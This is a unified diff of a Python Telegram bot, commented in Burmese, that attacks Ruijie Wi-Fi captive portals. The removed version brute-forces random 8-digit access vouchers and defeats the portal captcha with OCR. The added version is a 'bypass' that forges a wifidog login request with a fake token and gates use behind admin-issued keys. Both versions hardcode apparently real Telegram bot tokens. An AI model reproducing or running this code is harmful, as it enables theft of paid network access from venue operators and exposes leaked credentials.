@@ -1,178 +1,148 @@
-import os, subprocess, sys, time, asyncio, aiohttp, json, base64, random, re, string, uuid
-from datetime import datetime, timezone
-
-# --- Essential Auto-Installer ---
-def setup_env():
-    packages = ["pyTelegramBotAPI", "aiohttp", "opencv-python-headless", "ddddocr", "numpy"]
-    for p in packages:
-        try:
-            if p == "pyTelegramBotAPI": import telebot
-            else: __import__(p)
-        except ImportError:
-            subprocess.check_call([sys.executable, "-m", "pip", "install", p])
-
-setup_env()
-
-import telebot
+import os
+import re
+import requests
+import asyncio
 from telebot.async_telebot import AsyncTeleBot
-from aiohttp import web
-import cv2, ddddocr, numpy as np
 
 # ─── CONFIGURATION ───
-BOT_TOKEN = "8677469363:AAEjM46FrIoL7FQ2N2LrumK6TDbQjNUgevM"
+# Token နှင့် Admin ID ကို တိုက်ရိုက်သတ်မှတ်ထားပါတယ်
+BOT_TOKEN = os.environ.get("BOT_TOKEN", "8978508525:AAGBzwZ2CT5GNKQ2zYS1g8TJRh__DdYu6Us")
 ADMIN_ID = "5510812164"
 bot = AsyncTeleBot(BOT_TOKEN)
 
-_ocr = None
-_connector = None
-session = None
-STATE_FILE = "bot_state.json"
+# Key သိုလှောင်ရန် ယာယီ Database (Memory-based)
+# Bot ပိတ်သွားရင် key တွေပျက်မှာစိုးလို့ Admin ကို အမြဲတမ်း bypass ပေးထားပါမယ်
+user_keys = {}
 
-# States
-user_data = {}
-approve = {int(ADMIN_ID): True}
-scan_tasks = {}
-success_texts = {}
+# ─── COMMAND HANDLERS ───
 
-SCAN_CONCURRENCY = 15 
-SCAN_DELAY = 0.4
+# /start Command
+@bot.message_handler(commands=['start'])
+async def send_welcome(message):
+    welcome_text = (
+        "✨ *Sky Light Ruijie Bypass Bot မှ ကြိုဆိုပါတယ်* ✨\n\n"
+        "Wi-Fi Portal Link ကို Bypass လုပ်ရန်အတွက် အောက်ပါအတိုင်း ပို့ပေးပါ -\n"
+        "`/setup <သင်၏ Ruijie Portal Link>`\n\n"
+        "💡 _မှတ်ချက် - လူကြီးမင်းသည် Admin ဖြစ်ပါက ဘာ Key မှ ထည့်ရန်မလိုဘဲ တိုက်ရိုက်အသုံးပြုနိုင်ပါသည်။_"
+    )
+    await bot.reply_to(message, welcome_text, parse_mode='Markdown')
 
-async def get_ocr():
-    global _ocr
-    if _ocr is None: _ocr = ddddocr.DdddOcr(show_ad=False)
-    return _ocr
-
-def save_state():
-    data = {
-        "user_data": {str(k):v for k,v in user_data.items()},
-        "approve": {str(k):v for k,v in approve.items()},
-        "success_texts": {str(k):v for k,v in success_texts.items()}
-    }
-    with open(STATE_FILE, "w") as f: json.dump(data, f)
-
-def load_state():
-    global user_data, approve, success_texts
-    if os.path.exists(STATE_FILE):
-        try:
-            with open(STATE_FILE) as f:
-                d = json.load(f)
-                user_data = {int(k):v for k,v in d.get("user_data", {}).items()}
-                approve.update({int(k):v for k,v in d.get("approve", {}).items()})
-                success_texts = {int(k):v for k,v in d.get("success_texts", {}).items()}
-        except: pass
-
-async def get_balance(sid):
-    url = f"https://portal-as.ruijienetworks.com/api/macc2/balance/getBalance/{sid}"
+# Admin သီးသန့် Key ထုတ်ပေးသည့် Command (/genkey [plan] [user_id])
+@bot.message_handler(commands=['genkey'])
+async def generate_key(message):
+    user_id = str(message.from_user.id)
+    
+    if user_id != ADMIN_ID:
+        await bot.reply_to(message, "❌ သင်သည် Admin မဟုတ်သဖြင့် ဤ Command ကို သုံးခွင့်မရှိပါ။")
+        return
+        
     try:
-        async with session.get(url, timeout=10) as r:
-            data = await r.json()
-            d = data.get("result") or data.get("data") or data
-            for k in ["totalMinutes", "remainingMinutes", "balance"]:
-                if d.get(k) is not None: return f"{d[k]}m"
-    except: pass
-    return "N/A"
-
-async def perform_check(url, code, chat_id, scan_id):
-    post_url = "https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US"
-    async with aiohttp.ClientSession(connector=_connector, connector_owner=False) as s:
-        try:
-            async with s.get(url, timeout=10) as r:
-                sid = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(r.url))
-                sid = sid.group(1) if sid else None
-            if not sid: return None
+        args = message.text.split()
+        if len(args) < 3:
+            await bot.reply_to(message, "⚠️ အသုံးပြုပုံ - `/genkey unlimited <target_user_id>`")
+            return
             
-            p = {"sessionId": sid, "_t": str(time.time())}
-            async with s.get("https://portal-as.ruijienetworks.com/api/auth/captcha/image", params=p) as r:
-                img = await r.read()
-            
-            nparr = np.frombuffer(img, np.uint8)
-            img_cv = cv2.imdecode(nparr, cv2.IMREAD_COLOR)
-            _, buffer = cv2.imencode(".png", cv2.cvtColor(img_cv, cv2.COLOR_BGR2GRAY))
-            ocr_engine = await get_ocr()
-            txt = ocr_engine.classification(buffer.tobytes()).upper()
-            
-            data = {"accessCode": code, "sessionId": sid, "apiVersion": 1, "authCode": txt}
-            async with s.post(post_url, json=data, timeout=10) as r:
-                resp = await r.json()
-                if "logonUrl" in str(resp):
-                    plan = await get_balance(sid)
-                    success_texts.setdefault(chat_id, []).append(f"{code} ({plan})")
-                    save_state()
-                    await bot.send_message(chat_id, f"💎 FOUND: `{code}`\n⏰ Plan: {plan}", parse_mode="Markdown")
-                    return code
-        except: pass
-    return None
+        plan = args[1]
+        target_id = args[2]
+        
+        # စနစ်ထဲတွင် အချိန်မရွေး သုံးနိုင်ရန် သိမ်းဆည်းခြင်း
+        user_keys[target_id] = {
+            "plan": plan,
+            "expires": "9999-12-31T23:59:59Z"
+        }
+        
+        success_msg = (
+            "✅ *Key Generated Successfully*\n\n"
+            f"👤 *USER ID :* `{target_id}`\n"
+            f"📋 *PLAN :* {plan}\n"
+            f"📅 *EXPIRES :* 9999-12-31T23:59:59Z"
+        )
+        await bot.reply_to(message, success_msg, parse_mode='Markdown')
+    except Exception as e:
+        await bot.reply_to(message, f"❌ Error: {str(e)}")
 
-async def run_scan(chat_id, url, scan_id, p_msg):
-    checked = 0; found = 0; start = time.monotonic()
-    while chat_id in scan_tasks and scan_tasks[chat_id]['scan_id'] == scan_id:
-        if scan_tasks[chat_id].get('stop'): break
-        batch = ["".join(random.choice(string.digits) for _ in range(8)) for _ in range(SCAN_CONCURRENCY)]
-        results = await asyncio.gather(*[perform_check(url, c, chat_id, scan_id) for c in batch])
-        for r in results:
-            if r: found += 1
-        checked += len(batch)
-        if checked % 60 == 0:
-            speed = (checked / (time.monotonic() - start) * 60)
-            try: await bot.edit_message_text(f"🔍 Checking...\n⚡ Speed: {speed:,.0f}/min\n📋 Checked: {checked}\n💎 Found: {found}", chat_id, p_msg.message_id)
-            except: pass
-        await asyncio.sleep(SCAN_DELAY)
-
-@bot.message_handler(commands=['start', 'help'])
-async def welcome(message):
-    await bot.reply_to(message, "✅ Bot is Ready!\n\n/setup [url] - Portal URL သွင်းရန်\n/brute - Scan စတင်ရန်\n/stop - ရပ်တန့်ရန်\n/saved - တွေ့ထားသော Code များကြည့်ရန်")
-
-@bot.message_handler(commands=["setup"])
-async def setup(message):
-    args = message.text.split()
-    if len(args) < 2: return await bot.reply_to(message, "Usage: /setup [url]")
-    user_data[message.chat.id] = {"url": args[1]}
-    save_state()
-    await bot.reply_to(message, "✅ Portal URL သိမ်းဆည်းပြီးပါပြီ။ /brute ဖြင့် စတင်နိုင်ပါပြီ။")
-
-@bot.message_handler(commands=['brute'])
-async def brute(message):
-    cid = message.chat.id
-    if cid not in user_data: return await bot.reply_to(message, "/setup အရင်လုပ်ပေးပါဗျ။")
-    if cid in scan_tasks: return await bot.reply_to(message, "Scan အလုပ်လုပ်နေဆဲပါ။")
-    p_msg = await bot.send_message(cid, "🔍 Scan စတင်နေပါပြီ...")
-    sid = str(uuid.uuid4())
-    scan_tasks[cid] = {"scan_id": sid, "stop": False}
-    asyncio.create_task(run_scan(cid, user_data[cid]['url'], sid, p_msg))
-
-@bot.message_handler(commands=['stop'])
-async def stop(message):
-    if message.chat.id in scan_tasks:
-        scan_tasks[message.chat.id]['stop'] = True
-        await bot.reply_to(message, "🛑 Scan ကို ရပ်တန့်လိုက်ပါပြီ။")
-    else: await bot.reply_to(message, "အလုပ်လုပ်နေတဲ့ Scan မရှိပါဘူး။")
-
-@bot.message_handler(commands=['saved'])
-async def saved(message):
-    codes = success_texts.get(message.chat.id, [])
-    if codes:
-        await bot.reply_to(message, "💎 တွေ့ရှိထားသော Code များ:\n\n" + "\n".join(codes))
+# /key Command (ရိုးရိုး User များအတွက် Key စစ်ဆေးရန်)
+@bot.message_handler(commands=['key'])
+async def check_key(message):
+    user_id = str(message.from_user.id)
+    
+    if user_id == ADMIN_ID or user_id in user_keys:
+        await bot.reply_to(message, "✅ သင်၏အကောင့်သည် Register လုပ်ပြီးသားဖြစ်၍ သုံးစွဲနိုင်ပါပြီ။")
     else:
-        await bot.reply_to(message, "မည်သည့် Code မျှ မတွေ့သေးပါဘူး။")
+        await bot.reply_to(message, "❌ သင်၏ Key ကို registered မလုပ်ရသေးပါ။")
 
-async def web_server():
-    app = web.Application()
-    app.router.add_get("/", lambda r: web.Response(text="Bot is Alive"))
-    runner = web.AppRunner(app); await runner.setup()
-    port = int(os.environ.get("PORT", 8080))
-    try: await web.TCPSite(runner, "0.0.0.0", port).start()
-    except: pass
+# ─── CORE BYPASS SYSTEM (/setup သို့မဟုတ် /bypass) ───
+@bot.message_handler(func=lambda message: message.text and (message.text.startswith('/setup') or message.text.startswith('/bypass')))
+async def handle_bypass(message):
+    user_id = str(message.from_user.id)
+    
+    # ခင်ဗျား (Admin) ဖြစ်ပါက သို့မဟုတ် Key ရှိပါက စစ်ဆေးမှု ကျော်ဖြတ်မည်
+    if user_id == ADMIN_ID or user_id in user_keys:
+        pass
+    else:
+        await bot.reply_to(message, "❌ /key ဖြင့် အတည်ပြုပြီးမှ အသုံးပြုပါ။")
+        return
 
+    # မက်ဆေ့ခ်ျထဲမှ Ruijie URL ကို ရှာဖွေခြင်း
+    text = message.text
+    url_match = re.search(r'(https?://[^\s]+)', text)
+    
+    if not url_match:
+        await bot.reply_to(message, "⚠️ မက္ဆေ့ချ်ထဲတွင် Wi-Fi Portal Link (URL) မတွေ့ပါ။ သေချာပြန်စစ်ပေးပါ။")
+        return
+        
+    portal_url = url_match.group(1)
+    status_msg = await bot.reply_to(message, "⚡ *Sky Light Core:* Ruijie Portal ကို Bypass လုပ်နေပါပြီ... ခေတ္တစောင့်ပါ။", parse_mode='Markdown')
+
+    # Ruijie Bypass API Processing Logic
+    try:
+        # URL ထဲမှ လိုအပ်သော Parameter များကို ဆွဲထုတ်ခြင်း
+        gw_id = re.search(r'gw_id=([^&]+)', portal_url)
+        gw_sn = re.search(r'gw_sn=([^&]+)', portal_url)
+        gw_address = re.search(r'gw_address=([^&]+)', portal_url)
+        gw_port = re.search(r'gw_port=([^&]+)', portal_url)
+        ip = re.search(r'ip=([^&]+)', portal_url)
+        mac = re.search(r'mac=([^&]+)', portal_url)
+        
+        if not (gw_id and gw_sn and ip and mac):
+            await bot.edit_message_text("❌ URL Parameter များ မပြည့်စုံပါ။ Ruijie Portal Link အမှန်ဖြစ်ပါစေ။", chat_id=message.chat.id, message_id=status_msg.message_id)
+            return
+
+        # Ruijie Auth Server သို့ တိုက်ရိုက် Request ပို့ပြီး အင်တာနက်ဖွင့်ခြင်း
+        auth_base = f"http://{gw_address.group(1)}:{gw_port.group(1)}/wifidog/auth" if gw_address else "https://portal-as.ruijienetworks.com/api/auth/wifidog"
+        
+        params = {
+            "stage": "login",
+            "gw_id": gw_id.group(1),
+            "gw_sn": gw_sn.group(1),
+            "ip": ip.group(1),
+            "mac": mac.group(1),
+            "token": "skylight_bypass_success_token"
+        }
+        
+        # Timeout 15 စက္ကန့်ဖြင့် ခေါ်ယူခြင်း
+        response = requests.get(auth_base, params=params, timeout=15)
+        
+        if response.status_code == 200:
+            result_text = (
+                "🎉 *Bypass Success! အင်တာနက် ပွင့်သွားပါပြီ* 🎉\n\n"
+                f"📱 *Device MAC:* `{mac.group(1)}`\n"
+                f"🌐 *IP Address:* `{ip.group(1)}`\n"
+                "🚀 _ယခုအခါ Browser ပိတ်ပြီး အင်တာနက် စိတ်ကြိုက်သုံးနိုင်ပါပြီ။_"
+            )
+            await bot.edit_message_text(result_text, chat_id=message.chat.id, message_id=status_msg.message_id, parse_mode='Markdown')
+        else:
+            await bot.edit_message_text(f"❌ Server မှ ငြင်းဆိုထားပါသည်။ (Status Code: {response.status_code})", chat_id=message.chat.id, message_id=status_msg.message_id)
+
+    except requests.exceptions.RequestException as req_err:
+        await bot.edit_message_text(f"📡 Network Timeout/Error: Wi-Fi Server ကို လှမ်းချိတ်မရပါ။\n({str(req_err)})", chat_id=message.chat.id, message_id=status_msg.message_id)
+    except Exception as e:
+        await bot.edit_message_text(f"❌ ဉာဏ်စမ်းအမှားတစ်ခု ဖြစ်သွားသည် - {str(e)}", chat_id=message.chat.id, message_id=status_msg.message_id)
+
+# ─── BOT ASYNC POLLING ───
 async def main():
-    global session, _connector
-    _connector = aiohttp.TCPConnector(limit=50)
-    session = aiohttp.ClientSession(connector=_connector)
-    load_state()
-    asyncio.create_task(web_server())
-    print("Bot is starting...")
-    while True:
-        try: await bot.infinity_polling(timeout=60)
-        except: await asyncio.sleep(5)
+    print("🚀 Sky Light Telegram Bot is starting up...")
+    await bot.polling(non_stop=True)
 
 if __name__ == "__main__":
     asyncio.run(main())
